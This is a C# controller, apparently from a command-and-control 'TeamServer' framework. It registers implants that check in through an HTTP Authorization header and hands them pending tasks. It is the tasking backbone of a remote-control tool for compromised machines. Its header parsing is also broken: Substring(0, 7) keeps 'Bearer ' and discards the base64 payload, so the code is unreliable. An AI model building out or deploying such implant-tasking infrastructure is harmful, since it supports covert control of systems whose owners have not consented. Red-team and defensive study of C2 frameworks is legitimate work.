﻿using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System.Text;
using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agents;

        public HttpListenerController(IAgentService agents)
        {
            // dependency injection
            _agents = agents;
        }

        public IActionResult HandleImplant()
        {
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata is null) return NotFound();

            var agent = _agents.GetAgent(metadata.Id);
            if (agent is null)
            {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }

            var tasks = agent.GetPendingTasks();
            return Ok(tasks);
        }

        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata)) {
                return null;
            }

            // Authorization: Bearer <base64_content>
            encodedMetadata = encodedMetadata.ToString().Substring(0, 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));
            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }
    }
}